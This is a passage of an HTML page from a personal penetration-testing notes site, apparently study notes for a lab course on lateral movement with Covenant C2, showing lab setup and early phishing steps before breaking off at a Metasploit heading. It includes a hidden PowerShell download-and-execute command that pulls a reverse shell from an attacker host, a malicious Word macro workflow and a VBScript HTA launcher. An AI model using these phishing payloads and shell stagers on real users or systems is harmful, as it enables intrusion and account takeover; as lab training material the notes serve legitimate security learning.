@@ -1,0 +1,2074 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.19.2 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>6 - Movement, Pivoting and Persistence |</title>
+<meta name="description" content="Lateral Movement, Pivoting and Persistence using the C2 Covenant and Metasploit ">
+
+
+  <meta name="author" content="Nullified">
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="">
+<meta property="og:title" content="6 - Movement, Pivoting and Persistence">
+<meta property="og:url" content="http://localhost:4000/notes/pnpt/wpivoting/">
+
+
+  <meta property="og:description" content="Lateral Movement, Pivoting and Persistence using the C2 Covenant and Metasploit ">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/main/header4.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2023-11-27T00:00:00+06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/notes/pnpt/wpivoting/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "john",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title=" Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+<!-- favicon -->
+<link rel="icon" type="image/jpeg" sizes="32x32" href="/assets/images/main/fav-32x32.jpeg">
+<link rel="icon" type="image/jpeg" sizes="16x16" href="/assets/images/main/fav-16x16.jpeg">
+<meta name="theme-color" content="#ffffff">
+
+  </head>
+
+  <body class="layout--single single">
+    <nav class="skip-links">
+  <h2 class="screen-reader-text">Skip links</h2>
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/main/kaizen.png" alt=""></a>
+        
+        <a class="site-title" href="/">
+          
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/menu">Menu</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
+            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
+          </svg>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+  
+    
+
+    <div class="initial-content">
+      
+  
+
+
+
+
+
+
+
+<div class="page__hero--overlay"
+  style=" background-image: linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('/assets/images/main/header4.jpg');"
+>
+  
+    <div class="wrapper">
+      <h1 id="page-title" class="page__title" itemprop="headline">
+        
+          6 - Movement, Pivoting and Persistence
+
+        
+      </h1>
+      
+        <p class="page__lead">Lateral Movement, Pivoting and Persistence using the C2 Covenant and Metasploit
+</p>
+      
+      
+        <p class="page__meta"><i class="far fa-clock" aria-hidden="true"></i> 
+
+
+
+
+  24 minute read
+
+</p>
+      
+      
+      
+    </div>
+  
+  
+</div>
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+  
+    
+      
+      
+      
+      
+    
+    
+      
+
+<nav class="nav__list">
+  
+  <input id="ac-toc" name="accordion-toc" type="checkbox" />
+  <label for="ac-toc">Toggle menu</label>
+  <ul class="nav__items">
+    
+      <li>
+        
+          <span class="nav__sub-title">Posts</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/insights/roadmap/">- How to become a Pentester (2024)</a></li>
+          
+            <li><a href="/awareness/awarenessdoc/">- Security Awareness</a></li>
+          
+            <li><a href="/c2/sliverbasics/">- Sliver C2 Basics</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">Notes</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/notes/ejpt/">eJPT</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/ecppt/">eCPPTv2</a></li>
+          
+            <li><a href="/notes/ecppt/systemsecurity/">- System Security</a></li>
+          
+            <li><a href="/notes/ecppt/networksecurity/">- Network Security</a></li>
+          
+            <li><a href="/notes/ecppt/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/ecppt/linux/">- Linux Security</a></li>
+          
+            <li><a href="/notes/ecppt/webapp/">- Web App Security</a></li>
+          
+            <li><a href="/notes/ecppt/wifi/">- Wi-Fi Pentest</a></li>
+          
+            <li><a href="/notes/ecppt/ruby/">- Metasploit & Ruby</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/pnpt/">PNPT</a></li>
+          
+            <li><a href="/notes/pnpt/peh/">- Practical Ethical Hacker</a></li>
+          
+            <li><a href="/notes/pnpt/osint/">- OSINT</a></li>
+          
+            <li><a href="/notes/pnpt/pentestexternal/">- External Pentest Playbook</a></li>
+          
+            <li><a href="/notes/pnpt/linuxprivesc/">- Linux Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/winprivesc/">- Windows Privesc</a></li>
+          
+            <li><a href="/notes/pnpt/wpivoting/" class="active">- Movement, Pivoting and Persistence</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/eewptx/">eWPTXv2</a></li>
+          
+            <li><a href="/notes/ewptx/encoding/">- Encoding & Filtering</a></li>
+          
+            <li><a href="/notes/ewptx/evasionbasics/">- Evasion Basics</a></li>
+          
+            <li><a href="/notes/ewptx/xss/">- Cross-site scripting (XSS)</a></li>
+          
+            <li><a href="/notes/ewptx/xssfilter/">- XSS Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/csrf/">- Cross-site request forgery (CSRF)</a></li>
+          
+            <li><a href="/notes/ewptx/html5/">- HTML5</a></li>
+          
+            <li><a href="/notes/ewptx/sqli/">- SQL Injection</a></li>
+          
+            <li><a href="/notes/ewptx/sqlievasion/">- SQLI Filter Evasion</a></li>
+          
+            <li><a href="/notes/ewptx/xmlattacks/">- XML Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/zattackingserialization/">- Attacking Serialization</a></li>
+          
+            <li><a href="/notes/ewptx/serverside/">- Server Side Attacks</a></li>
+          
+            <li><a href="/notes/ewptx/crypto/">- Attacking Crypto</a></li>
+          
+            <li><a href="/notes/ewptx/authenticationsso/">- Authentication & SSO</a></li>
+          
+            <li><a href="/notes/ewptx/apiscloud/">- APIs & Cloud Apps</a></li>
+          
+            <li><a href="/notes/ewptx/ldap/">- Attacking LDAP</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="">Active Directory Exploitation</a></li>
+          
+            <li><a href="/notes/adx/powershell/">- Powershell</a></li>
+          
+            <li><a href="/notes/adx/bloodhound/">- Bloodhound</a></li>
+          
+            <li><a href="/notes/adx/privesc/">- Win Privesc</a></li>
+          
+            <li><a href="/notes/adx/zlateralmov/">- Lateral Movement</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crtp/">CRTP</a></li>
+          
+            <li><a href="/notes/crtp/enum/">- AD Enumeration</a></li>
+          
+            <li><a href="/notes/crtp/winprivesc/">- Local Privesc</a></li>
+          
+            <li><a href="/notes/crtp/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crtp/offdotnet/">- Offensive .NET</a></li>
+          
+            <li><a href="/notes/crtp/domdom/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crtp/domprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crtp/defense/">- AD Defense</a></li>
+          
+            <li><a href="">────────────────</a></li>
+          
+            <li><a href="/review/crte/">CRTE</a></li>
+          
+            <li><a href="/notes/crte/latmov/">- Lateral Movement</a></li>
+          
+            <li><a href="/notes/crte/adprivesc/">- AD Privesc</a></li>
+          
+            <li><a href="/notes/crte/adpersistence/">- AD Persistence</a></li>
+          
+            <li><a href="/notes/crte/cross/">- Cross attacks</a></li>
+          
+            <li><a href="/notes/crte/cheatsheet/">- Cheat Sheet</a></li>
+          
+        </ul>
+        
+      </li>
+    
+      <li>
+        
+          <span class="nav__sub-title">My CVEs</span>
+        
+
+        
+        <ul>
+          
+            <li><a href="/cve/xss/">CVE-2024-2479</a></li>
+          
+            <li><a href="/cve/sqli/">CVE-2024-2480</a></li>
+          
+        </ul>
+        
+      </li>
+    
+  </ul>
+</nav>
+
+    
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="6 - Movement, Pivoting and Persistence">
+    <meta itemprop="description" content="Lateral Movement, Pivoting and Persistence using the C2 Covenant and Metasploit">
+    <meta itemprop="datePublished" content="2023-11-27T00:00:00+06:00">
+    
+
+    <div class="page__inner-wrap">
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> On this page</h4></header>
+              <ul class="toc__menu">
+  <li><a href="#lab-setup">Lab Setup</a>
+    <ul>
+      <li><a href="#virtual-box-config">Virtual Box Config</a></li>
+      <li><a href="#machines-config">Machines Config</a></li>
+      <li><a href="#lab-config">Lab Config</a></li>
+    </ul>
+  </li>
+  <li><a href="#introduction-to-command-and-control-c2">Introduction to Command and Control (C2)</a>
+    <ul>
+      <li><a href="#introduction-to-covenant">Introduction to Covenant</a></li>
+    </ul>
+  </li>
+  <li><a href="#gaining-the-foothold">Gaining the Foothold</a>
+    <ul>
+      <li><a href="#enum">Enum</a></li>
+      <li><a href="#phishing-doc">Phishing DOC</a></li>
+    </ul>
+  </li>
+  <li><a href="#phishing-with-hta--html">Phishing with HTA / HTML</a></li>
+  <li><a href="#phishing-with-metasploit">Phishing with Metasploit</a>
+    <ul>
+      <li><a href="#password-spraying-finding">Password Spraying Finding</a></li>
+    </ul>
+  </li>
+  <li><a href="#enumeration-the-local-machine-privilege-escalation-and-local-persistence">Enumeration the Local Machine, Privilege Escalation and Local Persistence</a>
+    <ul>
+      <li><a href="#local-enumeration">Local Enumeration</a></li>
+      <li><a href="#autologon-misconfiguration-and-exploitation">AutoLogon Misconfiguration and Exploitation</a></li>
+      <li><a href="#alwaysinstallelevated-misconfiguration-and-exploitation">AlwaysInstallElevated Misconfiguration and Exploitation</a></li>
+      <li><a href="#fodhelper-uac-bypass-with-covenant">FodHelper UAC Bypass with Covenant</a></li>
+      <li><a href="#persistence">Persistence</a></li>
+      <li><a href="#port-forward">Port Forward</a></li>
+      <li><a href="#workstation-dominance">Workstation Dominance</a></li>
+      <li><a href="#bypassing-defender-with-fodhelper">Bypassing Defender with FodHelper</a></li>
+    </ul>
+  </li>
+  <li><a href="#domain-enumeration">Domain Enumeration</a>
+    <ul>
+      <li><a href="#downloading-files">Downloading Files</a></li>
+      <li><a href="#enumerating-users">Enumerating Users</a></li>
+      <li><a href="#enumerating-groups">Enumerating Groups</a></li>
+      <li><a href="#enumerating-domain-computers">Enumerating Domain Computers</a></li>
+      <li><a href="#enum-gpo--acl">Enum GPO / ACL</a></li>
+      <li><a href="#powershell-remoting">Powershell Remoting</a></li>
+    </ul>
+  </li>
+  <li><a href="#movement-pivoting-and-persistence-in-the-domain">Movement, Pivoting and Persistence in the Domain</a>
+    <ul>
+      <li><a href="#necessary-domain-misconfigurations">Necessary Domain Misconfigurations</a></li>
+      <li><a href="#overview-bloodhound">Overview Bloodhound</a></li>
+      <li><a href="#abusing-acls">Abusing ACLs</a></li>
+      <li><a href="#pivoting-through-remote-desktop-via-compromised-host">Pivoting through Remote Desktop via Compromised Host</a></li>
+      <li><a href="#configuring-reverse-port-forward">Configuring Reverse Port Forward</a></li>
+      <li><a href="#gaining-a-shell-on-an-internal-workstation">Gaining a Shell on an Internal Workstation</a></li>
+      <li><a href="#remoting-through-proxychains">Remoting Through ProxyChains</a></li>
+      <li><a href="#unconstrained-delegation">Unconstrained Delegation</a></li>
+      <li><a href="#golden-ticket-persistence">Golden TIcket Persistence</a></li>
+      <li><a href="#reverse-port-forwarding-for-shell-on-dc01">Reverse Port Forwarding for Shell on DC01</a></li>
+    </ul>
+  </li>
+</ul>
+
+            </nav>
+          </aside>
+        
+        <script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="nullified" data-description="Support me on Buy me a coffee!" data-message="" data-color="#FF813F" data-position="Right" data-x_margin="18" data-y_margin="18"></script>
+
+<blockquote>
+  <p>[INFO] Even though this course is not necessary to pass the PNPT exam, I’m adding it here anyway.</p>
+</blockquote>
+
+<p><strong>Resources</strong>:</p>
+
+<p>Mayor Notes: https://themayor.notion.site/themayor/Pentesting-Notes-9c46a29fdead4d1880c70bfafa8d453a</p>
+
+<p>git: https://github.com/dievus/adgenerator</p>
+
+<p>Share: https://mayorsec-my.sharepoint.com/personal/joe_mayorsec_com/_layouts/15/onedrive.aspx?id=%2Fpersonal%2Fjoe%5Fmayorsec%5Fcom%2FDocuments%2FCourse%20Share%20Drive</p>
+
+<p>MayorSec discord: https://discord.gg/AWx2SxCD69</p>
+
+<h1 id="lab-setup">Lab Setup</h1>
+
+<h2 id="virtual-box-config">Virtual Box Config</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>File &gt; preferences &gt; Network &gt; add new
+
+External: 192.168.3.0/24
+Internal: 192.168.16.0/24
+Secure: 10.120.116.0/24
+</code></pre></div></div>
+
+<h3 id="ubuntumail">UbuntuMail</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Settings &gt; Network &gt; NatNetwork: External
+</code></pre></div></div>
+
+<h3 id="windows-10x64-enterprise---workstation-1">Windows 10x64 Enterprise - Workstation 1</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Network &gt; 
+Adapter1 &gt; Natnetwork: External
+Adapter2 &gt; Natnetwork: Internal
+Adapter3 &gt; Natnetwork: Secure
+</code></pre></div></div>
+
+<h3 id="windows-server-2019">Windows Server 2019</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>DC01
+Natnetwork: Secure
+Password123!
+</code></pre></div></div>
+
+<h2 id="machines-config">Machines Config</h2>
+
+<h3 id="dc-config">DC config</h3>
+<p>https://github.com/dievus/adgenerator</p>
+
+<blockquote>
+  <p>grab the files of this git</p>
+</blockquote>
+
+<p>Powershell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Set-ExecutionPolicy</span><span class="w"> </span><span class="nx">Unrestricted</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Y</span><span class="w">
+</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\Invoke-ForestDeploy.ps1</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">R</span><span class="w">
+</span><span class="n">Invoke-ForestDeploy</span><span class="w"> </span><span class="nt">-DomainName</span><span class="w"> </span><span class="nx">mayorsec.local</span><span class="w">
+</span><span class="n">set</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="nx">password</span><span class="w">
+</span><span class="n">restart</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>log using mayorsec&lt;user&gt;</li>
+</ul>
+
+<p>Powershell:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\ADGenerator.ps1</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">R</span><span class="w">
+</span><span class="n">Invoke-ADGenerator</span><span class="w"> </span><span class="nt">-DomainName</span><span class="w"> </span><span class="nx">mayorsec.local</span><span class="w">
+</span></code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Network Adapter &gt; properties &gt; ipv4:
+10.120.116.75
+255.255.255.0
+10.120.116.1
+127.0.0.1
+8.8.8.8
+</code></pre></div></div>
+
+<h3 id="workstation-1---windows-10x64">Workstation 1 - WIndows 10x64</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Settings &gt; 2cpus
+20gb hd - 2gb ram
+storage disk file : iso
+network: 3 adpters = nat network
+- external
+- internal
+- secure
+
+s.chisholm:FallOutBoy1!
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Network Adapter (modify the secure network - the 10.* range)&gt; properties &gt; ipv4: 
+	10.120.116.10
+	255.255.255.0
+	10.120.116.1
+	10.120.116.75
+	8.8.8.8
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access Work or School &gt; connect &gt; Join this device AD domain &gt; mayorsec.local
+s.chisholm:FallOutBoy1! &gt; Administrator &gt; restart
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\\10.120.116.75\Shared\ADGenerator &gt; copy nameGen to desktop
+open Powershell as administrator &gt; Set-ExecutionPolicy Unrestricted &gt; Y
+
+  . .\nameGen.ps1
+  executeScript -ComputerName WORKSTATION-01
+
+restart &gt; log in and restart again to load the GPO config
+
+edit C:\Windows\System32\drivers\etc\hosts
+  &lt;ubuntuMail IP&gt; mail.mayorsec.com
+</code></pre></div></div>
+
+<h3 id="workstation-2---windows10x64">Workstation 2 - windows10x64</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Settings &gt; 2cpus
+20gb hd - 2gb ram
+storage disk file : iso
+network: 2 adpters = nat network
+	internal
+	secure
+
+m.seitz:Phi11i35@44
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Network Adapter (modify the secure network - the 10.* range)&gt; properties &gt; ipv4: 
+10.120.116.20
+255.255.255.0
+10.120.116.1
+10.120.116.75
+8.8.8.8
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Access Work or School &gt; connect &gt; Join this device AD domain &gt; mayorsec.local
+m.seitz:Phi11i35@44 &gt; Administrator &gt; restart
+
+\\10.120.116.75\Shared\ADGenerator &gt; copy nameGen to desktop
+open Powershell as administrator &gt; Set-ExecutionPolicy Unrestricted &gt; Y
+
+. .\nameGen.ps1
+executeScript -ComputerName WORKSTATION-02
+
+restart &gt; log in and restart again to load the GPO config
+
+edit C:\Windows\System32\drivers\etc\hosts
+  &lt;ubuntuMail IP&gt; mail.mayorsec.com
+</code></pre></div></div>
+
+<h3 id="ubuntumail-1">UbuntuMail</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cpu 1
+ram 2gb
+Settings &gt; Network &gt; Nat Network&gt; external
+
+login as &gt; studentuser:Password123!
+ip: 192.168.3.4
+gateway: 192.168.3.1
+dns: 8.8.8.8
+
+edit /etc/hosts
+  127.0.0.1 mail.mayorsec.com mayorsec.com
+  &lt;ubuntuMail ip&gt; mail.mayorsec.com mayorsec.com
+</code></pre></div></div>
+
+<p>in Kali:
+edit /etc/hosts</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;ubuntuMail ip&gt; mail.mayorsec.com mayorsec.com
+</code></pre></div></div>
+
+<p>In Workstation 1:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>open in the browser the ubuntuMail : 192.168.3.4 (or whatever the ip is)
+this should open a Roundcube Webmail
+</code></pre></div></div>
+
+<p>Optional:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>A Kali Linux Distro is available For the course. 
+Just make sure the network config is set to 'NAT Network: External'
+https://1drv.ms/f/s!AlDxd4Hr_BuOrxTds39VMqiV5VjK
+</code></pre></div></div>
+
+<h2 id="lab-config">Lab Config</h2>
+
+<h3 id="dc01">DC01</h3>
+<p>10.120.116.75</p>
+
+<h3 id="w01">W01</h3>
+<p>s.chisholm - FallOutBoy1!
+10.120.116.10</p>
+
+<h3 id="w02">W02</h3>
+<p>m.seitz - Phi11i35@44
+10.120.116.20</p>
+
+<h3 id="mail">Mail</h3>
+<p>192.168.3.5</p>
+
+<h1 id="introduction-to-command-and-control-c2">Introduction to Command and Control (C2)</h1>
+
+<ul>
+  <li>C2 is the combination of techniques and tools used by Pentesters and ethical hackers to persist and communicate in a target environment</li>
+</ul>
+
+<p>Tools:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Covenant - https://github.com/cobbr/Covenant
+
+Metasploit - https://github.com/rapid7/metasploit-framework
+</code></pre></div></div>
+
+<h2 id="introduction-to-covenant">Introduction to Covenant</h2>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">cd</span><span class="w"> </span><span class="nx">/opt/Covenant/Covenant</span><span class="w">
+</span><span class="n">dotnet</span><span class="w"> </span><span class="nx">run</span><span class="w">
+
+</span><span class="n">studentuser:Password123</span><span class="o">!</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Grunts = user sessions</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># In Launchers &gt; Host &gt; </span><span class="w">
+
+</span><span class="c"># we can search For a rev shell, this will encode our command</span><span class="w">
+</span><span class="c"># we send to the target windows to grab our revshell and execute it.</span><span class="w">
+
+</span><span class="n">example</span><span class="w"> </span><span class="nx">command:</span><span class="w">
+</span><span class="n">powershell</span><span class="w"> </span><span class="nt">-Sta</span><span class="w"> </span><span class="nt">-Nop</span><span class="w"> </span><span class="nt">-Window</span><span class="w"> </span><span class="nx">Hidden</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"iex (New-Object Net.WebClient).DownloadString('http://&lt;kali ip&gt;/&lt;revshell.ps1')"</span><span class="w">
+
+</span><span class="c"># Data &gt; Credentials = this functionality will save the credentials we found a long the way</span><span class="w">
+</span></code></pre></div></div>
+
+<table>
+  <tbody>
+    <tr>
+      <td>Session</td>
+      <td>Id</td>
+      <td>Value</td>
+    </tr>
+    <tr>
+      <td>0</td>
+      <td>&gt;0</td>
+      <td> </td>
+    </tr>
+    <tr>
+      <td>medium</td>
+      <td>local</td>
+      <td>user</td>
+    </tr>
+    <tr>
+      <td>high</td>
+      <td>local</td>
+      <td>admin</td>
+    </tr>
+    <tr>
+      <td>system 0</td>
+      <td>domain</td>
+      <td>admin</td>
+    </tr>
+    <tr>
+      <td>system &gt;0</td>
+      <td>DC</td>
+      <td>system admin</td>
+    </tr>
+  </tbody>
+</table>
+
+<h1 id="gaining-the-foothold">Gaining the Foothold</h1>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://mayosec.github.io/MayorSecSecuritySolutions/
+</code></pre></div></div>
+
+<h2 id="enum">Enum</h2>
+<ul>
+  <li>Write down names/usernames</li>
+  <li>we can run <strong>namemash.py</strong> to transform all gathered names into possible usernames</li>
+</ul>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">python3</span> <span class="n">namemash</span><span class="p">.</span><span class="n">py</span> <span class="o">&lt;</span><span class="n">names</span><span class="o">-</span><span class="nb">file</span><span class="p">.</span><span class="n">txt</span><span class="o">&gt;</span>
+</code></pre></div></div>
+
+<p>Run owasp ZAP:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">attack</span><span class="w"> </span><span class="err">&gt;</span><span class="w"> </span><span class="nx">fuzz</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">intruder</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">burp</span><span class="w">
+</span><span class="n">here</span><span class="w"> </span><span class="nx">we</span><span class="w"> </span><span class="nx">can</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="nx">username/password</span><span class="w"> </span><span class="nx">as</span><span class="w"> </span><span class="nx">variables</span><span class="w"> </span><span class="nx">and</span><span class="w"> </span><span class="nx">try</span><span class="w"> </span><span class="nx">password</span><span class="w"> </span><span class="nx">spraying/credential</span><span class="w"> </span><span class="nx">stuffing</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="phishing-doc">Phishing DOC</h2>
+<p>write an email with that access</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go to github &gt; nishang Out-Word.ps1 
+# this will put a malicious macro in your word file
+save the exploit: notepad &gt; OutWord.ps1
+</code></pre></div></div>
+
+<p>Create a listener in Convenant:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Listeners &gt; httpListener: 
+name: HTTP Listener
+ConnectAddresses: &lt;kali ip&gt;
+ConnectPort: 80 (or another if u want)
+Save
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Go to Lauchers &gt; Powershell &gt; Generate &gt; Listener: HTTP Listener
+DotNetVersion: Net40
+KillDate: something in the future
+Generate
+# Lauchers &gt; Host &gt; url: rev,ps1 &gt; host
+copy the encoded payload
+</code></pre></div></div>
+
+<p>Go to Workstation-01: where the phishing is happening:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell &gt; import OutWord.ps1 = . .\OutWord.ps1
+run the file &gt; OutWord.ps1 -Payload "paste the encoded payload" -OutputFile Something.doc
+now we gotta send the something.doc to the kali machine
+</code></pre></div></div>
+
+<p>in Kali:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smbserver.py Share . -smb2support
+</code></pre></div></div>
+
+<p>Workstation-01:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>just drag the file to the share folder
+</code></pre></div></div>
+
+<blockquote>
+  <p>When the word file is open - enable content
+it will generate a <em>GruntHTTP</em>, that means a session in our Convenant</p>
+</blockquote>
+
+<p>Host the malicious file:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Convenant &gt; Listeners &gt; Hosted Files &gt; Create &gt; Select the file &gt; Create
+localhost/file.doc : if its openning to save the file, then is correct
+</code></pre></div></div>
+
+<p>Going on with the phishing:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>add a link in the email redirecting to the Kali IP/file.doc &gt; send it
+everyone that opens that, will generate a shell in our Convenant
+</code></pre></div></div>
+
+<h1 id="phishing-with-hta--html">Phishing with HTA / HTML</h1>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">mkdir </span>file.hta
+&lt;script <span class="nv">language</span><span class="o">=</span><span class="s2">"VBScript"</span><span class="o">&gt;</span>
+Function DoStuff<span class="o">()</span>
+  Dim wsh
+    Set wsh <span class="o">=</span> CreateObject<span class="o">(</span><span class="s2">"Wscript.shell"</span><span class="o">)</span>
+    wsh.run <span class="s2">"&lt;powershell command here&gt;"</span>
+    Set wsh <span class="o">=</span> Nothing
+End Function
+
+DoStuff
+self.close
+&lt;/script&gt;
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy the payload to the "powershell command here" area.
+host the file in Convenant
+  Convenant &gt; Listeners &gt; Hosted Files &gt; Create &gt; Select the file &gt; Create
+  localhost/file.hta : if its openning to save the file, then is correct
+</code></pre></div></div>
+
+<h1 id="phishing-with-metasploit">Phishing with Metasploit</h1>
